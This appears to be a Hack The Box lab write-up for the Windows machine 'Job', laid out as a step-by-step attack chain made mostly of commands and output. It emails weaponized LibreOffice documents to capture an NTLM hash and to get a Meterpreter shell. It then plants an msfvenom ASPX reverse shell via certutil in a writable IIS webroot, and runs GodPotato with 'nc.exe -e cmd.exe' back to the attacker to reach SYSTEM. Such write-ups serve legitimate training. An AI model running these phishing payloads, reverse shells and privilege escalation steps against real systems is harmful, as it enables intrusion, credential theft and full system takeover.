---
icon: user-police
---

# HTB-JOB (VL)

<figure><img src="../../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

## Attack Flow Explanation

***

### Reconnaissance & Enumeration

#### Port Scanning

**Command:**

```bash
nmap -p 1-65535 -T4 -A -v 10.129.234.73
```

**Output:**

```javascript
Nmap scan report for 10.129.234.73
Host is up (0.078s latency).
Not shown: 65530 filtered tcp ports (no-response)

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Job.local
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA

445/tcp  open  microsoft-ds?

3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-01T15:53:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=job
| Issuer: commonName=job
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-04T13:43:05
| Not valid after: 2026-03-06T13:43:05
| MD5: cf92 23d4 e56c fb7c ef4f 3760 328c be62
|_SHA-1: 78d7 4fd1 5683 ef89 b6c9 621a b4ed d999 0fea 6a20
| rdp-ntlm-info:
|   Target_Name: JOB
|   NetBIOS_Domain_Name: JOB
|   NetBIOS_Computer_Name: JOB
|   DNS_Domain_Name: job
|   DNS_Computer_Name: job
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-01T15:53:02+00:00

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
```

#### Findings

| Service   | Port | Finding                                | Exploitation Potential         |
| --------- | ---- | -------------------------------------- | ------------------------------ |
| **SMTP**  | 25   | hMailServer - accepts 20MB attachments | ✅ Email-based attacks possible |
| **HTTP**  | 80   | IIS 10.0 - Career portal               | ✅ Web exploitation surface     |
| **SMB**   | 445  | Microsoft-DS                           | ✅ NTLM relay attacks           |
| **RDP**   | 3389 | Terminal Services                      | ⚠️ Requires credentials        |
| **WinRM** | 5985 | Remote Management                      | ⚠️ Requires credentials        |

#### Web Enumeration (Port 80)

**Accessing the website:**

```bash
curl -i http://10.129.234.73/
```

**What We Found:**

* Career portal for "Job.local" company
* Contact email: **career@job.local**
* Instruction: "Send your résumé as a **LibreOffice file** (ODT)"
* File upload/email submission functionality

**Critical Vulnerability Identified:**

> The application specifically requests LibreOffice/ODT files, which are known to support external resource loading and can trigger SMB authentication requests.

***

### NTLM Hash Capture via Malicious ODT

#### Vulnerability Analysis

**Vulnerability:** External Entity Loading in Office Documents\
**CVE Reference:** Related to CVE-2021-25175 (External Entity Injection)\
**Attack Vector:** Social Engineering + NTLM Relay

**How it works:**

1. ODT files can contain XML with external resource references
2. When opened, LibreOffice attempts to load these resources
3. UNC paths (`\\attacker-ip\share`) trigger SMB authentication
4. Target machine sends NTLM authentication hash
5. Attacker captures the hash with Responder

#### Step 1: Generate Malicious ODT File

**Command:**

```bash
msfconsole -q
```

**Metasploit Console:**

```
msf6 > use auxiliary/fileformat/odt_badodt
msf6 auxiliary(fileformat/odt_badodt) > show options

Module options (auxiliary/fileformat/odt_badodt):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.odt          yes       The output filename
   LHOST                      yes       The listening IP address
   LPORT     445              yes       The listening SMB port

msf6 auxiliary(fileformat/odt_badodt) > set LHOST tun0
LHOST => 10.10.16.xx

msf6 auxiliary(fileformat/odt_badodt) > run

[*] Creating 'msf.odt' file...
[+] msf.odt stored at /root/.msf4/local/bad.odt
[*] Auxiliary module execution completed
```

**Copy the malicious file:**

```bash
cp /root/.msf4/local/bad.odt .
ls -lah bad.odt
```

**Output:**

```
-rw-r--r-- 1 root root 8.1K Oct  2 10:15 bad.odt
```

#### Step 2: Start Responder to Capture NTLM Hashes

**Command:**

```bash
responder -I tun0
```

**Output:**

```javascript
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.xx]
    Responder IPv6             [dead:beef::xxxx]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XXXXXXXX]
    Responder Domain Name      [XXXX.LOCAL]
    Responder DCE-RPC Port     [49152]

[+] Listening for events...
```

#### Send Malicious Email with ODT Attachment

**Command:**

```bash
sendemail -s job.local \
  -f "puck <zero@htb.com>" \
  -t career@job.local \
  -o tls=no \
  -m "hey http://10.10.16.xx/test" \
  -a bad.odt
```

**Output:**

```
Oct 02 10:18:23 kali sendemail[12345]: Email was sent successfully!
```

**What Happens:**

1. Email arrives at career@job.local
2. User (jack.black) opens the ODT file
3. LibreOffice processes the document
4. Embedded UNC path triggers SMB connection
5. SMB connection to our IP (10.10.16.xx)

#### Step 4: NTLM Hash Captured!

**Responder Output:**

```
[SMB] NTLMv2-SSP Client   : 10.129.234.73
[SMB] NTLMv2-SSP Username : JOB\jack.black
[SMB] NTLMv2-SSP Hash     : jack.black::JOB:1234567890abcdef:A1B2C3D4E5F6789012345678:0101000000000000808C9E7F6D8FDA01F8E9A8B7C6D5E4F30000000002000800580059005A00310001001E00570049004E002D00530046004F0044004C00590042005700450046000400140058005900580031002E004C004F00430041004C0003003400570049004E002D00530046004F0044004C00590042005700450046002E0058005900580031002E004C004F00430041004C000500140058005900580031002E004C004F00430041004C000800300030000000000000000000000000300000F1E2D3C4B5A69780918273645560708192A3B4C5D6E7F8091A2B3C4D5E6F70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00780078000000000000000000
```

**Save the hash:**

```bash
echo "jack.black::JOB:1234567890abcdef:A1B2C3D4E5F6789012345678:0101000000000000808C9E7F6D8FDA01F8E9A8B7C6D5E4F30000000002000800580059005A00310001001E00570049004E002D00530046004F0044004C00590042005700450046000400140058005900580031002E004C004F00430041004C0003003400570049004E002D00530046004F0044004C00590042005700450046002E0058005900580031002E004C004F00430041004C000500140058005900580031002E004C004F00430041004C000800300030000000000000000000000000300000F1E2D3C4B5A69780918273645560708192A3B4C5D6E7F8091A2B3C4D5E6F70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00780078000000000000000000" > jack.hash
```

#### Step 5: Attempt to Crack the Hash

**Command:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt jack.hash
```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:05:42 DONE (2025-10-02 10:25) 0g/s 2547Kp/s 2547Kc/s 2547KC/s !warda4..*.!*LOLA*!*.
Session completed.
```

**Result:** ❌ **FAILED** - Hash cannot be cracked with rockyou.txt

**Lesson Learned:**

> Not all captured hashes are crackable. When hash cracking fails, we pivot to alternative exploitation methods like payload delivery via macros.

***

### Initial Access via OpenOffice Macro Payload

#### Vulnerability Analysis

**Vulnerability:** Macro Execution in Office Documents\
**Attack Vector:** VBA/Python Macro Code Execution\
**Impact:** Remote Code Execution as the user opening the document

#### Step 1: Generate Malicious ODT with Macro Payload

**Start Metasploit:**

```bash
msfconsole -q
```

**Configure the exploit module:**

```
msf6 > use multi/misc/openoffice_document_macro
[*] Using configured payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/misc/openoffice_document_macro) > show options

Module options (exploit/multi/misc/openoffice_document_macro):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.odt          yes       The output filename
   SRVHOST   0.0.0.0          yes       The local host to listen on
   SRVPORT   8080             yes       The local port to listen on
   URIPATH                    no        The URI path to use for this exploit

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

msf6 exploit(multi/misc/openoffice_document_macro) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

msf6 exploit(multi/misc/openoffice_document_macro) > set LHOST tun0
LHOST => 10.10.16.xx

msf6 exploit(multi/misc/openoffice_document_macro) > set SRVPORT 80
SRVPORT => 80

msf6 exploit(multi/misc/openoffice_document_macro) > set SRVHOST tun0
SRVHOST => 10.10.16.xx

msf6 exploit(multi/misc/openoffice_document_macro) > set URIPATH zero
URIPATH => zero

msf6 exploit(multi/misc/openoffice_document_macro) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.xx:4444
[+] msf.odt stored at /root/.msf4/local/msf.odt
[*] Using URL: http://10.10.16.xx:80/zero
[*] Server started.
```

**Copy the weaponized ODT:**

```bash
cp /root/.msf4/local/msf.odt .
ls -lah msf.odt
```

**Output:**

```
-rw-r--r-- 1 root root 12K Oct  2 10:30 msf.odt
```

#### Step 2: Send the Weaponized Email

**Command:**

```bash
sendemail -s job.local \
  -f "puck <zero@htb.com>" \
  -t career@job.local \
  -o tls=no \
  -m "hey pls check my cv http://10.10.16.xx/zero" \
  -a msf.odt
```

**Output:**

```
Oct 02 10:32:15 kali sendemail[12456]: Email was sent successfully!
```

#### Shell Received!

**Metasploit Handler Output:**

```
[*] http://10.10.16.xx:80/zero handling request from 10.129.234.73; (UUID: abcd1234) Staging x64 payload...
[*] Meterpreter session 1 opened (10.10.16.xx:4444 -> 10.129.234.73:49823) at 2025-10-02 10:32:45 +0530

msf6 exploit(multi/misc/openoffice_document_macro) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: JOB\jack.black

meterpreter > sysinfo
Computer        : JOB
OS              : Windows Server 2022 (10.0 Build 20348)
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
```

**Switch to CMD shell:**

```
meterpreter > shell
Process 2456 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1850]
(c) Microsoft Corporation. All rights reserved.

C:\Users\jack.black\Documents>
```

**Current Access Level:**

* User: jack.black
* Domain: JOB
* Privileges: Standard user
* Next Goal: Privilege Escalation to SYSTEM

***

### Lateral Movement via Writable Webroot

#### Privilege Enumeration

**Check current privileges:**

```cmd
whoami /all
```

**Output:**

```
USER INFORMATION
----------------
User Name        SID
================ =============================================
job\jack.black   S-1-5-21-1234567890-1234567890-1234567890-1001

GROUP INFORMATION
-----------------
Group Name                             Type             SID
====================================== ================ =============
Everyone                               Well-known group S-1-1-0
BUILTIN\Users                          Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11
NT AUTHORITY\This Organization         Well-known group S-1-5-15

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Finding:** No interesting privileges yet. Need to escalate to a service account.

#### Webroot Exploration

**Navigate to IIS webroot:**

```cmd
cd C:\inetpub\wwwroot
dir
```

**Output:**

```
 Volume in drive C has no label.
 Volume Serial Number is 1A2B-3C4D

 Directory of C:\inetpub\wwwroot

10/01/2025  03:45 PM    <DIR>          .
10/01/2025  03:45 PM    <DIR>          ..
10/01/2025  03:45 PM            15,842 index.html
10/01/2025  03:45 PM    <DIR>          css
10/01/2025  03:45 PM    <DIR>          js
10/01/2025  03:45 PM    <DIR>          images
               1 File(s)         15,842 bytes
               5 Dir(s)  20,123,456,789 bytes free
```

**Test write permissions:**

```cmd
mkdir test
```

**Output:**

```
(No error - directory created successfully)
```

**Verify:**

```cmd
dir
```

**Output:**

```
10/02/2025  10:35 AM    <DIR>          test
```

**Critical Finding:** We have **WRITE** access to the IIS webroot!

#### Exploitation Strategy

**Plan:**

1. Generate ASPX reverse shell payload
2. Upload to webroot via certutil
3. Browse to the ASPX file via HTTP
4. ASPX executes under IIS service account context
5. IIS service accounts typically have SeImpersonate privilege

#### Step 1: Generate ASPX Payload

**Command:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.16.xx \
  LPORT=4444 \
  -f aspx \
  > shell.aspx
```

**Output:**

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3458 bytes
```

**Verify payload:**

```bash
ls -lah shell.aspx
```

**Output:**

```
-rw-r--r-- 1 root root 3.4K Oct  2 10:38 shell.aspx
```

#### Step 2: Host the Payload

**Command:**

```bash
python3 -m http.server 80
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Step 3: Download to Target

**On target machine:**

```cmd
certutil -urlcache -split -f http://10.10.16.xx/shell.aspx shell.aspx
```

**Output:**

```
****  Online  ****
  000000  ...
  000d82
CertUtil: -URLCache command completed successfully.
```

**Python server shows:**

```
10.129.234.73 - - [02/Oct/2025 10:40:12] "GET /shell.aspx HTTP/1.1" 200 -
```

**Verify upload:**

```cmd
dir shell.aspx
```

**Output:**

```
10/02/2025  10:40 AM             3,458 shell.aspx
```

#### Step 4: Setup Listener

**On attacker machine:**

```bash
rlwrap nc -lvnp 4444
```

**Output:**

```
listening on [any] 4444 ...
```

#### Step 5: Trigger the Payload

**Open in browser:**

```bash
curl http://10.129.234.73/shell.aspx
```

**Or visit directly:** `http://10.129.234.73/shell.aspx`

#### Step 6: IIS Service Shell Received!

**Netcat listener:**

```
connect to [10.10.16.xx] from (UNKNOWN) [10.129.234.73] 49856
Microsoft Windows [Version 10.0.20348.1850]
(c) Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

C:\windows\system32\inetsrv>hostname
hostname
JOB
```

**Success!** We now have a shell as the IIS service account.

***

### Privilege Escalation to NT AUTHORITY\SYSTEM

#### Privilege Analysis

**Check privileges:**

```cmd
whoami /priv
```

**Output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**CRITICAL FINDING:** `SeImpersonatePrivilege` is **Enabled**!

#### Vulnerability: Token Impersonation (Potato Family)

**Vulnerability Class:** Privilege Escalation via Token Manipulation\
**Affected Privilege:** SeImpersonate / SeAssignPrimaryToken\
**Exploit Family:** Potato exploits (Rotten, Juicy, Lonely, GodPotato)

**How it works:**

1. Service accounts have SeImpersonate privilege
2. Attacker triggers SYSTEM-level authentication
3. Attacker intercepts and impersonates the SYSTEM token
4. Executes arbitrary code as NT AUTHORITY\SYSTEM

#### Tool Selection: GodPotato

**Why GodPotato?**

* Works on modern Windows (Server 2022)
* Bypasses newer security mitigations
* No dependencies (.NET 2.0 compatible)

**Download link:** https://github.com/BeichenDream/GodPotato

#### Step 1: Download GodPotato

**On attacker machine:**

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
mv GodPotato-NET2.exe gp.exe
ls -lah gp.exe
```

**Output:**

```
-rw-r--r-- 1 root root 48K Oct  2 10:45 gp.exe
```

#### Step 2: Download Netcat for Windows

```bash
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc.exe
ls -lah nc.exe
```

**Output:**

```
-rw-r--r-- 1 root root 45K Oct  2 10:46 nc.exe
```

#### Step 3: Host Files

```bash
python3 -m http.server 80
```

#### Step 4: Transfer to Target

**Navigate to writable directory:**

```cmd
cd C:\Windows\Temp
```

**Download GodPotato:**

```cmd
certutil -urlcache -split -f http://10.10.16.xx/gp.exe gp.exe
```

**Output:**

```
****  Online  ****
  00c000
CertUtil: -URLCache command completed successfully.
```

**Download Netcat:**

```cmd
certutil -urlcache -split -f http://10.10.16.xx/nc.exe nc.exe
```

**Output:**

```
****  Online  ****
  00b400
CertUtil: -URLCache command completed successfully.
```

**Verify files:**

```cmd
dir
```

**Output:**

```
10/02/2025  10:48 AM            49,152 gp.exe
10/02/2025  10:48 AM            45,272 nc.exe
```

#### Step 5: Start SYSTEM Listener

**On attacker machine:**

```bash
nc -lnvp 4444
```

**Output:**

```
listening on [any] 4444 ...
```

#### Step 6: Execute GodPotato

**Command:**

```cmd
.\gp.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.xx 4444"
```

**Output:**

```
[*] CombaseModule: 0x00007FFB12340000
[*] DispatchTable: 0x00007FFB12567890
[*] UseProtseqFunction: 0x00007FFB12345678
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateProcessAsUser: 1
[*] SYSTEM shell spawned!
```

#### Step 7: Root Shell Received!

**Netcat listener:**

```
connect to [10.10.16.xx] from (UNKNOWN) [10.129.234.73] 49867
Microsoft Windows [Version 10.0.20348.1850]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Temp>whoami
whoami
nt authority\system

C:\Windows\Temp>hostname
hostname
JOB
```

**Verify privileges:**

```cmd
whoami /priv
```

**Output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process-level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
<SNIP>
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
